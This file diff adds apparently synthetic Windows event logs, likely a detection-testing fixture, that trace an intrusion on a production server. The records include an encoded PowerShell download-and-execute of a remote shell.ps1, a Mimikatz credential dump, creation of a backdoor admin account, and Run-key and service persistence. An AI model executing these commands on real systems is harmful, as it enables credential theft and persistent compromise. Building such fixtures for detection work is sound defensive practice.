@@ -1,0 +1,151 @@
+[
+  {
+    "timestamp": "2025-09-08T16:30:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwAC8AcwBoAGUAbABsAC4AcABzADEAJwApAA==",
+      "ProcessId": "4444",
+      "ParentProcessId": "2222",
+      "User": "PRODUCTION\\admin",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:31:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\Temp\\mimikatz.exe",
+      "CommandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
+      "ProcessId": "5555",
+      "ParentProcessId": "4444",
+      "User": "PRODUCTION\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:32:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "3",
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "DestinationIp": "192.168.1.50",
+      "DestinationPort": "4444",
+      "Protocol": "tcp",
+      "ProcessId": "4444",
+      "User": "PRODUCTION\\admin",
+      "Category": "network_connection",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:33:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "CommandLine": "net user backdoor Password123! /add && net localgroup administrators backdoor /add",
+      "ProcessId": "6666",
+      "ParentProcessId": "4444",
+      "User": "PRODUCTION\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:34:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\reg.exe",
+      "CommandLine": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Persistence /t REG_SZ /d C:\\Windows\\Temp\\backdoor.exe /f",
+      "ProcessId": "7777",
+      "ParentProcessId": "4444",
+      "User": "PRODUCTION\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:35:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\whoami.exe",
+      "CommandLine": "whoami /all > C:\\Windows\\Temp\\recon.txt",
+      "ProcessId": "8888",
+      "ParentProcessId": "4444",
+      "User": "PRODUCTION\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:36:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\tasklist.exe",
+      "CommandLine": "tasklist /svc | findstr /i sql",
+      "ProcessId": "9999",
+      "ParentProcessId": "4444",
+      "User": "PRODUCTION\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:37:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\sc.exe",
+      "CommandLine": "sc create EvilService binpath= C:\\Windows\\Temp\\backdoor.exe start= auto",
+      "ProcessId": "1111",
+      "ParentProcessId": "4444",
+      "User": "PRODUCTION\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:38:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "4625",
+      "LogonType": "3",
+      "SubjectUserName": "admin",
+      "TargetUserName": "administrator",
+      "IpAddress": "192.168.1.100",
+      "WorkstationName": "ATTACKER-PC",
+      "Category": "authentication",
+      "Product": "windows"
+    }
+  },
+  {
+    "timestamp": "2025-09-08T16:39:00Z",
+    "host": "PRODUCTION-SERVER-01",
+    "fields": {
+      "EventID": "1",
+      "Image": "C:\\Windows\\System32\\netstat.exe",
+      "CommandLine": "netstat -an | findstr LISTEN",
+      "ProcessId": "2222",
+      "ParentProcessId": "4444",
+      "User": "PRODUCTION\\admin",
+      "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "Category": "process_creation",
+      "Product": "windows"
+    }
+  }
+]
